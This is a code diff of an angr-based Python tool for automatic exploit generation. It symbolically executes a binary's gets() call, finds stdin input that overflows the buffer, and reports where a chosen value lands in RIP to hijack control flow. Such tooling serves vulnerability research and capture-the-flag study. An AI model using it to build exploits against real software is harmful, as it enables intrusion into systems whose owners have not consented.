@@ -3,22 +3,31 @@ import claripy
 import load_state
 import struct
 from angr.storage.memory_mixins.address_concretization_mixin import MultiwriteAnnotation
+from angr.misc.ux import once
+import logging
+rip_pattern = 0xCCCCCCCCCCCCCCCC
 
-rip_pattern = 0xCCCCCCCC
+_l = logging.getLogger(name=__name__)
 
 
 
+class gets(angr.SimProcedure):
+	# pylint:disable=arguments-differ
 
-class angr_gets(angr.SimProcedure):
-	#pylint:disable=arguments-differ
 	def run(self, dst):
+		if once("gets_warning"):
+			_l.warning(
+				"The use of gets in a program usually causes buffer overflows. You may want to adjust "
+				"SimStateLibc.max_gets_size to properly mimic an overflowing read."
+			)
+
 		fd = 0
 		simfd = self.state.posix.get_fd(fd)
 		if simfd is None:
 			return 0
-			
-		max_size = self.state.libc.max_gets_size
 
+		max_size = self.state.libc.max_gets_size
+		dst=bof_aeg.stdin_buf_addr
 		# case 0: the data is concrete. we should read it a byte at a time since we can't seek for
 		# the newline and we don't have any notion of buffering in-memory
 		if simfd.read_storage.concrete:
@@ -29,9 +38,9 @@ class angr_gets(angr.SimProcedure):
 					break
 				self.state.memory.store(dst + count, data)
 				count += 1
-				if self.state.solver.is_true(data == b'\n'):
+				if self.state.solver.is_true(data == b"\n"):
 					break
-			self.state.memory.store(dst + count, b'\0')
+			self.state.memory.store(dst + count, b"\0")
 			return dst
 
 		# case 2: the data is symbolic, the newline could be anywhere. Read the maximum number of bytes
@@ -39,24 +48,25 @@ class angr_gets(angr.SimProcedure):
 		# newline nonsense.
 		# caveat: there could also be no newline and the file could EOF.
 		else:
-			print("[gets] stdin is symbolic")
-			data, real_size = simfd.read_data(max_size)
+			data, real_size = simfd.read_data(max_size - 1)
 
 			for i, byte in enumerate(data.chop(8)):
-				self.state.add_constraints(self.state.solver.If(
-					i+1 != real_size, 
-					byte != b'\n',
-					self.state.solver.Or(            # otherwise one of the following must be true:
-						i+2 == max_size,                 # - we ran out of space, or
-						simfd.eof(),                 # - the file is at EOF, or
-						byte == b'\n'                # - it is a newline
-					)))
-			self.state.add_constraints(byte == b'\n')# gets最后加入\n
-
+				self.state.add_constraints(
+					self.state.solver.If(
+						i + 1 != real_size,
+						byte != b"\n",  # if not last byte returned, not newline
+						self.state.solver.Or(  # otherwise one of the following must be true:
+							i + 2 == max_size,  # - we ran out of space, or
+							simfd.eof(),  # - the file is at EOF, or
+							byte == b"\n",  # - it is a newline
+						),
+					)
+				)
 			self.state.memory.store(dst, data, size=real_size)
-			end_address = dst + real_size - 1
+			end_address = dst + real_size
 			end_address = end_address.annotate(MultiwriteAnnotation())
-			self.state.memory.store(end_address, b'\0')
+			self.state.memory.store(end_address, b"\0")
+
 			return dst
 
 
@@ -65,13 +75,12 @@ class Bof_Aeg(object):
 	def __init__(self, bin, base_addr):
 		# virtual base address
 		self.project = angr.Project(bin, main_opts={'base_addr': base_addr}, load_options={'auto_load_libs': False})
-		self.project.hook_symbol('gets',angr_gets())
-
+		#self.project.hook_symbol('gets', angr.SIM_PROCEDURES['libc']['gets']())
+		self.project.hook_symbol('gets', gets())
 		self.num_input_chars = 256
 		self.overflow = True
 		self.vuln_addr = 0
 		self.stdin_buf_addr = 0
-		
 
 	def is_unconstrained(self, m, constraints, start_addr):
 		''' Use concretized input which satisfies constraints to check if it can exploit vulnerability '''
@@ -83,6 +92,7 @@ class Bof_Aeg(object):
 			state.solver.add(c)
 		if not state.solver.satisfiable():
 			return False
+
 		concretized_input = state.solver.eval(self.symbolic_input, cast_to=bytes)
 		#trim 
 		print(concretized_input)
@@ -101,6 +111,7 @@ class Bof_Aeg(object):
 			angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
 			angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
 			})
+		load_state.set_regs(state, regs)
 		simgr = self.project.factory.simgr(state)
 		
 		simgr.explore(find=rip_pattern)
@@ -118,6 +129,7 @@ class Bof_Aeg(object):
 
 		# Sort the constraints based on the byte index
 		constraints = sorted(constraints, key=get_byte_index)
+
 		# binary search
 		n = len(constraints)
 		l = 0
@@ -161,23 +173,23 @@ class Bof_Aeg(object):
 		#symsize = claripy.BVS('stdin_size', 64)
 		
 		symbolic_input = claripy.BVS('input', self.num_input_chars*8)
-		self.symbolic_input = symbolic_input
+		#self.symbolic_input = symbolic_input
 		simfile = angr.SimFile('/dev/stdin', content=symbolic_input)
 		state = self.project.factory.call_state(addr=start_addr, add_options={
 			angr.options.CONSTRAINT_TRACKING_IN_SOLVER,
 			angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
 			angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
 			})
-		state.libc.buf_symbolic_bytes = 0x1000
-		state.libc.max_str_len = 0x1000
-		state.libc.max_gets_size = 0x200 # define gets() size; 溢出太长会影响system的envp
-
+		
+		state.libc.buf_symbolic_bytes = 0x100
+		state.libc.max_str_len = 0x100
+		state.libc.max_gets_size = 0x100 # define gets() size; 溢出太长会影响system的envp
 		def log_func(s):
 			print("[gets] rcx={}, rsp={}, rbp={}".format(hex(s.solver.eval(s.regs.rcx)), hex(s.solver.eval(s.regs.rsp)),  hex(s.solver.eval(s.regs.rbp))))
 			self.stdin_buf_addr = s.solver.eval(s.regs.rcx)
 			
 
-		state.inspect.b('simprocedure', simprocedure_name='angr_gets', when=angr.BP_BEFORE, action=log_func)
+		state.inspect.b('simprocedure', simprocedure_name='gets', when=angr.BP_BEFORE, action=log_func)
 		#for char in symbolic_input.chop(bits=8):
 		#	state.add_constraints(char >= 'A', char <= 'z')
 
@@ -189,7 +201,7 @@ class Bof_Aeg(object):
 		simgr = self.project.factory.simgr(state, save_unconstrained=True)
 		simgr.stashes['mem_corrupt']  = []
 		
-		simgr.explore(step_func=self.check_mem_corruption, find=end_addr)
+		simgr.explore(step_func=self.check_mem_corruption)
 		print("corrupt {} len={}".format(simgr.stashes['mem_corrupt'], len(simgr.stashes['mem_corrupt'])))
 	
 		if len(simgr.stashes['mem_corrupt'])==0:
@@ -200,17 +212,19 @@ class Bof_Aeg(object):
 
 		#input_bvv = claripy.BVV(input_value, len(input_value)*8)
 		#input_bvv = input_bvv.zero_extend((num_input_chars-len(input_value))*8)
+		unconstrained_state.solver.simplify()
 		stdin_constraints = unconstrained_state.solver.constraints
-		print(stdin_constraints)
+
+		self.symbolic_input = unconstrained_state.posix.stdin.content[0][0]
+
 		minimum_constraints = self.find_minimum_constraints(stdin_constraints, start_addr)
 		self.minimum_constraints = minimum_constraints
 
-		unconstrained_state.solver.simplify()
 		print("constraints = {}".format(minimum_constraints))
 		#IPython.embed()
 
 		# Solve for command-line argument that will let us set RBP and RIP
-		solution = unconstrained_state.solver.eval(symbolic_input, cast_to=bytes)
+		solution = unconstrained_state.solver.eval(self.symbolic_input, cast_to=bytes)
 		#print("Command-line arg to hijack rip:", solution)
 		print("Hijacked-value to be placed at offset:", solution.index(rip_pattern.to_bytes(8, byteorder='little')))
 		#print(rip_pattern)
@@ -254,6 +268,7 @@ def main():
 	if len(sys.argv) != 7:
 	  sys.exit("Not enough args")
 	bin = str(sys.argv[1])
+	global regs, stack
 	regs = str(sys.argv[2])
 	stack = str(sys.argv[3])
 	start_addr = int(sys.argv[4], 16)
